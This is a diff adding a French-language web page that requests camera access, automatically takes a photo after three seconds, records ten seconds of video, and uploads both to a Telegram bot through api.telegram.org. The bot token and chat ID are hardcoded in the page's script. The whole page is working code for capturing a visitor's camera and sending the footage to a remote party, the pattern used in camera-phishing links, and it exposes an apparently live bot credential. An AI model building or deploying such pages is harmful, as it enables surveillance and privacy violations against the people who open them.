@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Photo + Vidéo auto → Telegram</title>
+<style>
+  body { font-family: sans-serif; text-align: center; background: #111; color: #eee; }
+  video { width: 90%; max-width: 640px; border-radius: 8px; margin-top: 20px; }
+  #status { margin-top: 10px; font-size: 1.1em; white-space: pre-line; }
+</style>
+</head>
+<body>
+<video id="cam" autoplay playsinline muted></video>
+<p id="status">Demande d'accès caméra...</p>
+
+<script>
+const BOT_TOKEN     = '8923372171:AAH60PG4woDX9kR3CpD6IIIY4oWnUbDm6-c';
+const CHAT_ID       = '8675191556';
+const DELAI_PHOTO   = 3000;               // photo 3 s après l'autorisation
+const DUREE_VIDEO   = 10000;              // vidéo de 10 secondes
+
+const video  = document.getElementById('cam');
+const status = document.getElementById('status');
+
+let stream;
+
+navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }, audio: false })
+  .then(s => {
+    stream = s;
+    video.srcObject = s;
+    status.textContent = 'Photo dans ' + (DELAI_PHOTO / 1000) + ' s, puis vidéo de ' + (DUREE_VIDEO / 1000) + ' s...';
+    setTimeout(prendrePhoto, DELAI_PHOTO);
+  })
+  .catch(err => {
+    status.textContent = 'Accès caméra refusé : ' + err.name;
+  });
+
+/* ---------- PHOTO ---------- */
+async function prendrePhoto() {
+  const canvas = document.createElement('canvas');
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+
+  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+  const ok = await envoyer(blob, 'sendPhoto', 'photo.jpg', 'photo');
+
+  status.textContent += '\nPhoto : ' + (ok ? 'envoyée ✔' : 'échec ✘');
+  enregistrerVideo();
+}
+
+/* ---------- VIDEO ---------- */
+function enregistrerVideo() {
+  const chunks = [];
+  const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+  rec.ondataavailable = e => chunks.push(e.data);
+
+  rec.onstop = async () => {
+    const blob = new Blob(chunks, { type: 'video/webm' });
+    const ok = await envoyer(blob, 'sendVideo', 'video.webm', 'video');
+    status.textContent += '\nVidéo : ' + (ok ? 'envoyée ✔' : 'échec ✘') + '\nTerminé.';
+    stream.getTracks().forEach(t => t.stop());
+  };
+
+  status.textContent += '\nEnregistrement vidéo en cours...';
+  rec.start();
+  setTimeout(() => rec.stop(), DUREE_VIDEO);
+}
+
+/* ---------- ENVOI ---------- */
+async function envoyer(blob, method, filename, field) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append(field, blob, filename);
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+      method: 'POST',
+      body: fd
+    });
+    const data = await res.json();
+    if (!data.ok) console.error('Telegram :', data.description);
+    return data.ok;
+  } catch (e) {
+    console.error('Réseau :', e);
+    return false;
+  }
+}
+</script>
+</body>
+</html>
